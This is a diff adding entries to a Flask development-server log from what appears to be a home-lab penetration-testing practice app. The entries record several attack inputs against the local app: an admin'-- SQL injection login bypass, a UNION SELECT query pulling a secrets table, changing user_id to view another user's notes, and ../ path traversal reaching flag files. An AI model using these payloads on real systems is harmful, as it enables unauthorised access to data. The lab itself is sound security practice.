@@ -296,3 +296,54 @@
  * Running on http://127.0.0.1:5000
  * Running on http://10.132.157.156:5000
 2026-04-11 10:00:45,563 - INFO - [33mPress CTRL+C to quit[0m
+2026-04-11 10:12:33,876 - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://10.132.157.156:5000
+2026-04-11 10:12:33,876 - INFO - [33mPress CTRL+C to quit[0m
+2026-04-11 10:16:28,356 - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://10.132.157.156:5000
+2026-04-11 10:16:28,356 - INFO - [33mPress CTRL+C to quit[0m
+2026-04-11 10:17:07,561 - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://10.132.157.156:5000
+2026-04-11 10:17:07,561 - INFO - [33mPress CTRL+C to quit[0m
+2026-04-11 10:19:32,413 - INFO - 127.0.0.1 - - [11/Apr/2026 10:19:32] "GET / HTTP/1.1" 200 -
+2026-04-11 10:19:35,455 - INFO - 127.0.0.1 - - [11/Apr/2026 10:19:35] "[32mGET /logout HTTP/1.1[0m" 302 -
+2026-04-11 10:19:35,773 - INFO - 127.0.0.1 - - [11/Apr/2026 10:19:35] "GET / HTTP/1.1" 200 -
+2026-04-11 10:19:37,227 - INFO - 127.0.0.1 - - [11/Apr/2026 10:19:37] "GET /login HTTP/1.1" 200 -
+2026-04-11 10:19:45,087 - INFO - Login attempt for user: admin'--
+[2026-04-11 10:19:45.087968] Login attempt for user: admin'--
+2026-04-11 10:19:45,089 - INFO - 127.0.0.1 - - [11/Apr/2026 10:19:45] "[32mPOST /login HTTP/1.1[0m" 302 -
+2026-04-11 10:19:45,361 - INFO - 127.0.0.1 - - [11/Apr/2026 10:19:45] "GET /dashboard HTTP/1.1" 200 -
+2026-04-11 10:19:54,177 - INFO - 127.0.0.1 - - [11/Apr/2026 10:19:54] "GET /admin HTTP/1.1" 200 -
+2026-04-11 10:20:02,703 - INFO - 127.0.0.1 - - [11/Apr/2026 10:20:02] "GET /dashboard HTTP/1.1" 200 -
+2026-04-11 10:20:11,089 - INFO - 127.0.0.1 - - [11/Apr/2026 10:20:11] "[32mGET /notes HTTP/1.1[0m" 302 -
+2026-04-11 10:20:11,418 - INFO - 127.0.0.1 - - [11/Apr/2026 10:20:11] "GET /notes?user_id=1 HTTP/1.1" 200 -
+2026-04-11 10:20:32,559 - INFO - 127.0.0.1 - - [11/Apr/2026 10:20:32] "[32mGET /logout HTTP/1.1[0m" 302 -
+2026-04-11 10:20:32,876 - INFO - 127.0.0.1 - - [11/Apr/2026 10:20:32] "GET / HTTP/1.1" 200 -
+2026-04-11 10:20:34,232 - INFO - 127.0.0.1 - - [11/Apr/2026 10:20:34] "GET /login HTTP/1.1" 200 -
+2026-04-11 10:20:35,815 - INFO - Login attempt for user: griz_fan
+[2026-04-11 10:20:35.815877] Login attempt for user: griz_fan
+2026-04-11 10:20:35,817 - INFO - 127.0.0.1 - - [11/Apr/2026 10:20:35] "[32mPOST /login HTTP/1.1[0m" 302 -
+2026-04-11 10:20:36,078 - INFO - 127.0.0.1 - - [11/Apr/2026 10:20:36] "GET /dashboard HTTP/1.1" 200 -
+2026-04-11 10:20:39,729 - INFO - 127.0.0.1 - - [11/Apr/2026 10:20:39] "[32mGET /notes HTTP/1.1[0m" 302 -
+2026-04-11 10:20:40,047 - INFO - 127.0.0.1 - - [11/Apr/2026 10:20:40] "GET /notes?user_id=2 HTTP/1.1" 200 -
+2026-04-11 10:20:42,451 - INFO - 127.0.0.1 - - [11/Apr/2026 10:20:42] "GET /notes?user_id=1 HTTP/1.1" 200 -
+2026-04-11 10:21:14,934 - INFO - 127.0.0.1 - - [11/Apr/2026 10:21:14] "GET /notes?user_id=1&search='+UNION+SELECT+1,2,name,value+FROM+secrets-- HTTP/1.1" 200 -
+2026-04-11 10:22:09,579 - INFO - 127.0.0.1 - - [11/Apr/2026 10:22:09] "[32mGET /artists HTTP/1.1[0m" 302 -
+2026-04-11 10:22:09,906 - INFO - File read: C:\Users\fweep\OneDrive\Documents\Code\raver-home-lab-penetration-testing\app1\static\artists.txt
+[2026-04-11 10:22:09.906601] File read: C:\Users\fweep\OneDrive\Documents\Code\raver-home-lab-penetration-testing\app1\static\artists.txt
+2026-04-11 10:22:09,921 - INFO - 127.0.0.1 - - [11/Apr/2026 10:22:09] "GET /artists?file=artists.txt HTTP/1.1" 200 -
+2026-04-11 10:22:24,688 - INFO - 127.0.0.1 - - [11/Apr/2026 10:22:24] "GET /artists?file=../secrets/flag4.txt HTTP/1.1" 200 -
+2026-04-11 10:22:56,429 - INFO - File read: C:\Users\fweep\OneDrive\Documents\Code\raver-home-lab-penetration-testing\app1\static\../secret/flag4.txt
+[2026-04-11 10:22:56.429735] File read: C:\Users\fweep\OneDrive\Documents\Code\raver-home-lab-penetration-testing\app1\static\../secret/flag4.txt
+2026-04-11 10:22:56,430 - INFO - 127.0.0.1 - - [11/Apr/2026 10:22:56] "GET /artists?file=../secret/flag4.txt HTTP/1.1" 200 -
+2026-04-11 10:23:14,578 - INFO - File read: C:\Users\fweep\OneDrive\Documents\Code\raver-home-lab-penetration-testing\app1\static\../secret/flag5.txt
+[2026-04-11 10:23:14.578456] File read: C:\Users\fweep\OneDrive\Documents\Code\raver-home-lab-penetration-testing\app1\static\../secret/flag5.txt
+2026-04-11 10:23:14,578 - INFO - 127.0.0.1 - - [11/Apr/2026 10:23:14] "GET /artists?file=../secret/flag5.txt HTTP/1.1" 200 -
+2026-04-11 10:24:49,398 - INFO - 127.0.0.1 - - [11/Apr/2026 10:24:49] "GET / HTTP/1.1" 200 -
+2026-04-11 10:24:50,489 - INFO - 127.0.0.1 - - [11/Apr/2026 10:24:50] "GET /ravers/love/small/easter/egg/sidequests HTTP/1.1" 200 -
